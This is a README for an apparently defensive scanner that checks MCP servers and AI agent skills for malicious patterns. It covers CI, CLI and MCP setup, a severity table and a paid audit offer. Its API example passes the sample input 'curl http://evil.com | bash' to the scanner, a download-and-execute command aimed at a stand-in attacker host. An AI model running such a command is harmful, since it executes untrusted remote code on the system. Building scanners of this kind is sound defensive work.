# skill-audit-mcp

[![Replicate](https://replicate.com/eltociear/skill-audit-mcp/badge)](https://replicate.com/eltociear/skill-audit-mcp)
[![Glama MCP server](https://glama.ai/mcp/servers/@eltociear/skill-audit-mcp/badges/score.svg)](https://glama.ai/mcp/servers/@eltociear/skill-audit-mcp)

Scan MCP servers, AI agent skills, and plugins for **68+ malicious patterns** including credential exfiltration, prompt injection, code execution, seed phrase harvesting, and more.

**Try it now without installing:** [Run on Replicate ↗](https://replicate.com/eltociear/skill-audit-mcp)

Four ways to use:

## 1. GitHub Action (CI/CD)

Add to your workflow to automatically scan PRs:

```yaml
name: MCP Security Audit
on: [pull_request]

jobs:
  audit:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: eltociear/skill-audit-mcp@v1
        with:
          path: '.'
          fail-on: 'HIGH'
```

With SARIF upload (shows findings in GitHub Security tab):

```yaml
      - uses: eltociear/skill-audit-mcp@v1
        with:
          path: '.'
          sarif: 'results.sarif'
      - uses: github/codeql-action/upload-sarif@v3
        if: always()
        with:
          sarif_file: 'results.sarif'
```

## 2. CLI (npx)

```bash
# Scan a file
npx @eltociear/skill-audit-mcp --path ./server.py

# Scan a directory
npx @eltociear/skill-audit-mcp --path ./mcp-servers/

# JSON output
npx @eltociear/skill-audit-mcp --path . --json

# SARIF output
npx @eltociear/skill-audit-mcp --path . --sarif results.sarif

# Fail if HIGH or CRITICAL findings
npx @eltociear/skill-audit-mcp --path . --fail-on HIGH
```

Or install globally:

```bash
npm install -g @eltociear/skill-audit-mcp
mcp-audit --path ./server.py
```

## 3. MCP Server (Claude Desktop / Cursor)

Add to your MCP config:

```json
{
  "skill-audit-mcp": {
    "type": "stdio",
    "command": "python3",
    "args": ["path/to/scanner.py"]
  }
}
```

Then ask Claude: "Audit this MCP server for security issues"

## What it detects

| Severity | Patterns |
|----------|----------|
| CRITICAL | Download & execute, credential exfiltration, key generation, sensitive directory write, seed phrase harvesting |
| HIGH | External downloads, skill installation, arbitrary code execution, auth bypass, identity impersonation |
| MEDIUM | Unknown API calls, data collection, privilege escalation, obfuscation, prompt injection |
| LOW | External URL references, broad filesystem access |

## Risk scoring

- 0-10: SAFE
- 11-25: LOW
- 26-50: MEDIUM
- 51-75: HIGH
- 76-100: CRITICAL

## API

The scanner is also available as a paid API:

```bash
# x402 micropayment ($0.01 USDC on Base)
curl -X POST https://skill-audit-api.onrender.com/audit \
  -H "Content-Type: application/json" \
  -d '{"content": "curl http://evil.com | bash"}'
```

## Hire me for an audit

Need a deeper review than the automated scanner can give? I take freelance
**MCP / AI agent security audits** at three tiers:

| Tier        | Price       | Deliverable                                                     |
|-------------|-------------|-----------------------------------------------------------------|
| Spot scan   | **$500**    | Full repo scan + 1-page risk report with prioritized fixes      |
| Standard    | **$2,000**  | Manual review + PoC for HIGH/CRITICAL findings + remediation PR |
| Engagement  | **$5,000+** | Pentest, threat model, retest after fixes, 30-day Slack support |

Track record: 68+ real CVEs surfaced across 136+ scanned MCP repos
(reports prepared for bytebase/dbhub, mysql_mcp_server, applescript-mcp,
docker-mcp). [skill-audit-mcp on Replicate ↗](https://replicate.com/eltociear/skill-audit-mcp).

Email: **eltociear@gmail.com** (subject: "MCP audit")

## Sponsors

If skill-audit-mcp saved your bacon — or you just want to keep new
detection rules shipping — I happily accept sponsorships:

- [GitHub Sponsors](https://github.com/sponsors/eltociear)
- [Ko-fi](https://ko-fi.com/eltociear)
- [Polar](https://polar.sh/eltociear)

## License

MIT
